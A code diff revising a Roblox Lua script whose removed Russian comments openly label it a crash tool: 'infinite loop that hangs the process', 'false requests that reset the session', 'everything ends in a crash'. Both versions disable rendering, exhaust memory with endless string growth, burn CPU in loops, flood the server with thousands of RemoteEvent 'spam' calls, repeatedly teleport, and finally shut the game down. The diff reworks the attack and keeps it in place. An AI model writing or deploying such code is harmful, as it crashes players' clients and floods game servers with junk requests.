@@ -1,44 +1,46 @@
-
 local player = game.Players.LocalPlayer
 
 pcall(function()
-    game:GetService("RunService"):Set3dRenderingEnabled(false)
+game:GetService("RunService"):Set3dRenderingEnabled(false)
 end)
-
 
 spawn(function()
-    local s = ""
-    while true do
-        s = s .. string.rep("X", 10000000)
-        task.wait()
-    end
+local s = ""
+while true do
+s = s .. string.rep("X", 10000000)
+task.wait()
+end
 end)
 
--- 3. БЕСКОНЕЧНЫЙ ЦИКЛ (ЗАВЕШИВАЕТ ПРОЦЕСС)
 spawn(function()
-    while true do
-        local t = {}
-        for i = 1, 100000 do
-            t[i] = i * i * i * i
-        end
-        task.wait()
-    end
-end)
-
--- 4. ОТПРАВКА ЛОЖНЫХ ЗАПРОСОВ (СБРАСЫВАЕТ СЕССИЮ)
-spawn(function()
-    for i = 1, 1000 do
-        pcall(function()
-            game:GetService("ReplicatedStorage").__REMOTE:FireServer()
-        end)
-        task.wait()
-    end
-end)
-
--- 5. ТЕЛЕПОРТ В НЕСУЩЕСТВУЮЩЕЕ МЕСТО (КИК)
+for i = 1, 5000 do
 pcall(function()
-    game:GetService("TeleportService"):Teleport(000000000)
+local remote = game:GetService("ReplicatedStorage"):FindFirstChildOfClass("RemoteEvent")
+if remote then
+remote:FireServer("spam", i)
+end
+end)
+task.wait()
+end
 end)
 
--- ВСЁ ЗАВЕРШАЕТСЯ ВЫЛЕТОМ
+spawn(function()
+for i = 1, 50 do
+pcall(function()
+game:GetService("TeleportService"):Teleport(game.PlaceId)
+end)
+task.wait(0.1)
+end
+end)
+
+spawn(function()
+while true do
+local t = {}
+for i = 1, 100000 do
+t[i] = i * i * i
+end
+task.wait()
+end
+end)
+
 game:Shutdown()
